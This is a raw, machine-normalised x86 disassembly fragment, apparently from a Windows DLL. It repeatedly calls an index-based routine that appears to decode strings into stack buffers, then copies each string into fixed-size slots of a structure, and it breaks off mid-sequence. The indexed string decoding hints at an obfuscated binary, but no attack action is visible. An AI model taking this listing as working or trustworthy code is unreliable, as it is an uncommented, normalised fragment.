lea edi [ ebp - 0xc98 ]
mov eax 0xd4
call sub_10009000
lea edi [ ebp - 0x680 ]
mov eax 0xa1
call sub_10009000
lea edi [ ebp - 0x734 ]
mov eax 0xd
call sub_10009000
lea edi [ ebp - 0x9e4 ]
mov eax 0x9f
call sub_10009000
lea edi [ ebp - 0x4e0 ]
mov eax 0x5a
call sub_10009000
lea edi [ ebp - 0x340 ]
mov eax 0x9b
call sub_10009000
lea edi [ ebp - 0x5a8 ]
mov eax 0x5c
call sub_10009000
lea edi [ ebp - 0x238 ]
mov eax 0x32
call sub_10009000
lea edi [ ebp - 0x6ec ]
mov eax 0x6
call sub_10009000
lea edi [ ebp - 0x6c8 ]
mov eax 0xc0
call sub_10009000
lea edi [ ebp - 0x58 ]
mov eax 0xe4
call sub_10009000
lea edi [ ebp - 0x2a8 ]
mov eax 0xff
call sub_10009000
lea edi [ ebp - 0x88 ]
mov eax 0x151
call sub_10009000
lea edi [ ebp - 0xdb0 ]
mov eax 0x110
call sub_10009000
lea edi [ ebp - 0x520 ]
mov eax 0x159
call sub_10009000
lea edi [ ebp - 0x758 ]
mov eax 0x6f
call sub_10009000
lea edi [ ebp - 0x638 ]
mov eax 0x152
call sub_10009000
lea edi [ ebp - 0x13c ]
mov eax 0xf
call sub_10009000
lea edi [ ebp - 0x2e0 ]
mov eax 0x4e
call sub_10009000
lea edi [ ebp - 0x360 ]
mov eax 0x47
call sub_10009000
lea edi [ ebp - 0xab8 ]
mov eax 0xc1
call sub_10009000
lea edi [ ebp - 0x5f0 ]
mov eax 0x103
call sub_10009000
lea edi [ ebp - 0xdf0 ]
mov eax 0x42
call sub_10009000
lea edi [ ebp - 0x3a0 ]
mov eax 0x36
call sub_10009000
lea edi [ ebp - 0xa60 ]
mov eax 0x94
call sub_10009000
lea edi [ ebp - 0x174 ]
mov eax 0xe7
call sub_10009000
lea edi [ ebp - 0x994 ]
mov eax 0xfe
call sub_10009000
lea edi [ ebp - 0x3e0 ]
mov eax 0x12d
call sub_10009000
lea edi [ ebp - 0xa0c ]
mov eax 0xdb
call sub_10009000
lea edi [ ebp - 0x254 ]
mov eax 0x9
call sub_10009000
lea edi [ ebp - 0x91c ]
mov eax 0x139
call sub_10009000
lea edi [ ebp - 0x1ac ]
mov eax 0x15a
call sub_10009000
lea edi [ ebp - 0x70 ]
mov eax 0x9c
call sub_10009000
lea edi [ ebp - 0x65c ]
mov eax 0xfa
call sub_10009000
lea edi [ ebp - 0x10 ]
mov eax 0x4d
call sub_10009000
lea edi [ ebp - 0x7a0 ]
mov eax 0xeb
call sub_10009000
lea edi [ ebp - 0x28c ]
mov eax 0xa
call sub_10009000
lea edi [ ebp - 0x1c8 ]
mov eax 0x131
call sub_10009000
lea edi [ ebp - 0x560 ]
mov eax 0x88
call sub_10009000
lea edi [ ebp - 0xc38 ]
mov eax 0xb7
call sub_10009000
lea edi [ ebp - 0x1e4 ]
mov eax 0x81
call sub_10009000
lea edi [ ebp - 0x6a4 ]
mov eax 0x40
call sub_10009000
lea edi [ ebp - 0xb68 ]
mov eax 0x2a
call sub_10009000
lea edi [ ebp - 0x96c ]
mov eax 0x21
call sub_10009000
lea edi [ ebp - 0x21c ]
mov eax 0x118
call sub_10009000
lea edi [ ebp - 0x420 ]
mov eax 0xa7
call sub_10009000
lea eax [ ebp - 0x830 ]
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x830 ]
push edx
push esi
call sub_100796a0
lea eax [ ebp - 0x380 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x380 ]
push eax
lea ecx [ esi + 0x108 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x710 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x710 ]
push edx
lea eax [ esi + 0x210 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xcfc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcfc ]
push ecx
lea edx [ esi + 0x318 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x5cc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x5cc ]
push eax
lea ecx [ esi + 0x420 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x9bc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x9bc ]
push edx
lea eax [ esi + 0x528 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x87c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x87c ]
push ecx
lea edx [ esi + 0x630 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x7c4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x7c4 ]
push eax
lea ecx [ esi + 0x738 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0xb8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xb8 ]
push edx
lea eax [ esi + 0x840 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xd34 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xd34 ]
push ecx
lea edx [ esi + 0x948 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xb94 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xb94 ]
push eax
lea ecx [ esi + 0xa50 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x77c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x77c ]
push edx
lea eax [ esi + 0xb58 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x2c4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2c4 ]
push ecx
lea edx [ esi + 0xc60 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x28 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ esi + 0xd68 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x190 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x190 ]
push edx
lea eax [ esi + 0xe70 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xb10 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb10 ]
push ecx
lea edx [ esi + 0xf78 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xa0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ esi + 0x1080 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x7e8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x7e8 ]
push edx
lea eax [ esi + 0x1188 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x104 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ esi + 0x1290 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x460 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x460 ]
push eax
lea ecx [ esi + 0x1398 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x40 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x40 ]
push edx
lea eax [ esi + 0x14a0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x200 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x200 ]
push ecx
lea edx [ esi + 0x15a8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x500 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x500 ]
push eax
lea ecx [ esi + 0x16b0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0xc0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xc0c ]
push edx
lea eax [ esi + 0x17b8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xd70 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xd70 ]
push ecx
lea edx [ esi + 0x18c0 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x440 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x440 ]
push eax
lea ecx [ esi + 0x19c8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x4c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4c0 ]
push edx
lea eax [ esi + 0x1ad0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x8f4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x8f4 ]
push ecx
lea edx [ esi + 0x1bd8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x270 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x270 ]
push eax
lea ecx [ esi + 0x1ce0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x300 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x300 ]
push edx
lea eax [ esi + 0x1de8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xbe0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xbe0 ]
push ecx
lea edx [ esi + 0x1ef0 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x540 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x540 ]
push eax
lea ecx [ esi + 0x1ff8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x944 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x944 ]
push edx
lea eax [ esi + 0x2100 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xb3c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb3c ]
push ecx
lea edx [ esi + 0x2208 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x584 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x584 ]
push eax
lea ecx [ esi + 0x2310 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0xae4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xae4 ]
push edx
lea eax [ esi + 0x2418 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x8a4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x8a4 ]
push ecx
lea edx [ esi + 0x2520 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x400 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x400 ]
push eax
lea ecx [ esi + 0x2628 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x8cc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x8cc ]
push edx
lea eax [ esi + 0x2730 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x480 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x480 ]
push ecx
lea edx [ esi + 0x2838 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x80c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x80c ]
push eax
lea ecx [ esi + 0x2940 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x158 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x158 ]
push edx
lea eax [ esi + 0x2a48 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xd0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xd0 ]
push ecx
lea edx [ esi + 0x2b50 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xc68 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc68 ]
push eax
lea ecx [ esi + 0x2c58 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x4a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4a0 ]
push edx
lea eax [ esi + 0x2d60 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x3c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x3c0 ]
push ecx
lea edx [ esi + 0x2e68 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xe8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ esi + 0x2f70 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x614 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x614 ]
push edx
lea eax [ esi + 0x3078 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xcc8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcc8 ]
push ecx
lea edx [ esi + 0x3180 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xa34 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa34 ]
push eax
lea ecx [ esi + 0x3288 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x854 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x854 ]
push edx
lea eax [ esi + 0x3390 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x320 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x320 ]
push ecx
lea edx [ esi + 0x3498 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x120 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ esi + 0x35a0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0xa8c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa8c ]
push edx
lea eax [ esi + 0x36a8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xc98 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc98 ]
push ecx
lea edx [ esi + 0x37b0 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x680 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x680 ]
push eax
lea ecx [ esi + 0x38b8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x734 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x734 ]
push edx
lea eax [ esi + 0x39c0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x9e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x9e4 ]
push ecx
lea edx [ esi + 0x3ac8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x4e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x4e0 ]
push eax
lea ecx [ esi + 0x3bd0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x340 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x340 ]
push edx
lea eax [ esi + 0x3cd8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x5a8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5a8 ]
push ecx
lea edx [ esi + 0x3de0 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x238 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ esi + 0x3ee8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x6ec ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x6ec ]
push edx
lea eax [ esi + 0x3ff0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x6c8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x6c8 ]
push ecx
lea edx [ esi + 0x40f8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x58 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ esi + 0x4200 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x2a8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x2a8 ]
push edx
lea eax [ esi + 0x4308 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x88 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x88 ]
push ecx
lea edx [ esi + 0x4410 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xdb0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xdb0 ]
push eax
lea ecx [ esi + 0x4518 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x520 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x520 ]
push edx
lea eax [ esi + 0x4620 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x758 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x758 ]
push ecx
lea edx [ esi + 0x4728 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x638 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x638 ]
push eax
lea ecx [ esi + 0x4830 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x13c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x13c ]
push edx
lea eax [ esi + 0x4938 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x2e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2e0 ]
push ecx
lea edx [ esi + 0x4a40 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x360 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x360 ]
push eax
lea ecx [ esi + 0x4b48 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0xab8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xab8 ]
push edx
lea eax [ esi + 0x4c50 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x5f0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5f0 ]
push ecx
lea edx [ esi + 0x4d58 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xdf0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xdf0 ]
push eax
lea ecx [ esi + 0x4e60 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x3a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3a0 ]
push edx
lea eax [ esi + 0x4f68 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xa60 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa60 ]
push ecx
lea edx [ esi + 0x5070 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x174 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x174 ]
push eax
lea ecx [ esi + 0x5178 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x994 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x994 ]
push edx
lea eax [ esi + 0x5280 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x3e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x3e0 ]
push ecx
lea edx [ esi + 0x5388 ]
push edx
call sub_100796a0
lea eax [ ebp - 0xa0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa0c ]
push eax
lea ecx [ esi + 0x5490 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x254 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x254 ]
push edx
lea eax [ esi + 0x5598 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x91c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x91c ]
push ecx
lea edx [ esi + 0x56a0 ]
push edx
